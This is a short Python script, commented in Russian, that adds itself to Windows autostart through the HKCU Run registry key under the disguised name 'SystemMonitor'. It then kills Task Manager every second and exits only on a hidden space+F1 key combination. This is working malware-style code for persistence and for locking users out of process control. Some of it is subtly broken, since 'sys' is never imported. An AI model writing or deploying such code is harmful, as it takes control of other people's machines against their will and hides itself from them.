import psutil
import time
import os
import winreg
import keyboard

# Функция для добавления в автозагрузку
def add_to_startup(file_path):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             "Software\Microsoft\Windows\CurrentVersion\Run",
                             0,
                             winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SystemMonitor", 0, winreg.REG_SZ, file_path)
        winreg.CloseKey(key)
        print("Программа добавлена в автозагрузку")
    except Exception as e:
        print(f"Ошибка при добавлении в автозагрузку: {e}")

# Функция для блокировки диспетчера задач
def block_taskmgr():
    while True:
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == 'taskmgr.exe':
                    proc.terminate()
            time.sleep(1)
        except Exception as e:
            print(f"Ошибка: {e}")
            time.sleep(1)

# Функция для отключения блокировки
def disable_blocking():
    if keyboard.is_pressed('space') and keyboard.is_pressed('f1'):
        print("Блокировка отключена")
        os._exit(0)

def main():
    # Получаем путь к текущему файлу
    file_path = os.path.abspath(__file__)
    
    # Добавляем в автозагрузку
    add_to_startup(file_path)
    
    # Запускаем блокировку
    blocking_thread = threading.Thread(target=block_taskmgr)
    blocking_thread.start()
    
    # Мониторинг клавиш для отключения
    while True:
        disable_blocking()
        time.sleep(0.1)

if __name__ == "__main__":
    try:
        import threading
        import keyboard
        main()
    except ModuleNotFoundError as e:
        print(f"Необходимо установить модуль: {str(e)}")
        os.system(f"{sys.executable} -m pip install {str(e).split()[-1]}")
        main()
